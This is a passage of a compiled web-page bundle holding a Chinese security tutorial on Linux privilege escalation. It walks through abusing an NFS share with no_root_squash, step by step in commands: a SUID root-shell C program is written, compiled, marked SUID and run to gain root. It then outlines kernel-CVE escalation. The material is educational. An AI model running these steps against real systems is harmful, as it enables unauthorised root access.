"),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("然后输入命令")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("showmount "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-e")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("IP地址"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("远程挂载地址"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("本地挂载地址"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("简单写一个提权程序")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0; }'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /nfs_client/suid-shell.c\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("编译")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("gcc /nfs_client/suid-shell.c "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" /nfs_client/suid-shell\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("赋权")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("chmod +s /nfs_client/suid-shell\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("然后回到要提权的服务器上以低权限运行suid-shell")]),s._v(" "),a("p",[s._v("可以看到提权")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_a702c74781e1afacb2112837bbe5c8c7.png",alt:""}})]),s._v(" "),a("p",[s._v("这其实也是一个逻辑漏洞问题，因为nfs开启no_root_sqaush后，远程的root用户连上去共享了root权限，编译出的suid-shell所属者是root，而且具有suid，那么靶机上的低权限用户运行该进程就相当与我们之前说的suid提权了。")]),s._v(" "),a("h3",{attrs:{id:"内核漏洞提权"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#内核漏洞提权"}},[s._v("#")]),s._v(" 内核漏洞提权")]),s._v(" "),a("p",[s._v("利用已经披露的内核漏洞提权的话基本上就是一把梭拿到root权限了。流程简单来说就是获取版本信息，然后查找相关版本提权的CVE，编译poc执行提权。")]),s._v(" "),a("h2",{attrs:{id:"参考资料"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#参考资料"}},[s._v("#")]),s._v(" 参考资料")]),s._v(" "),a("p",[s._v("https://askubuntu.com/questions/546219/what-is-the-difference-between-root-all-allall-all-and-root-all-all-all")]),s._v(" "),a("p",[s._v("https://cloud.tencent.com/developer/article/1708369")])])}),[],!1,null,null,null);a.default=e.exports}}]);